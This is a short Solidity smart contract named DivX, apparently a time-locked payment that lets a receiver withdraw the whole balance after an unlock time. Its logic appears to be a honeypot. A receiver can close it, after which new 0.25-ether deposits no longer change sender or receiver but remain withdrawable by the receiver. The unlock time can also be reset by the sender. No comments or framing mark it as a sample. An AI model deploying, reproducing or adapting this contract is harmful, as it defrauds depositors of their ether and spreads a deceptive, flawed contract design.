1 pragma solidity ^0.4.23;
2 
3 contract DivX
4 {
5     address  sender;
6     address  receiver;
7     uint unlockTime = 86400 * 7;
8     bool closed = false;
9  
10     function PutDiv(address _receiver) public payable {
11         if( (!closed&&(msg.value >=0.25 ether)) || sender==0x0 ) {
12             sender = msg.sender;
13             receiver = _receiver;
14             unlockTime += now;
15         }
16     }
17     
18     function SetDivTime(uint _unixTime) public {
19         if(msg.sender==sender) {
20             unlockTime = _unixTime;
21         }
22     }
23     
24     function GetDiv() public payable {
25         if(receiver==msg.sender&&now>unlockTime) {
26             msg.sender.transfer(address(this).balance);
27         }
28     }
29     
30     function CloseDiv() public {
31         if (msg.sender==receiver&&receiver!=0x0) {
32            closed=true;
33         } else revert();
34     }
35     
36     function() public payable{}
37 }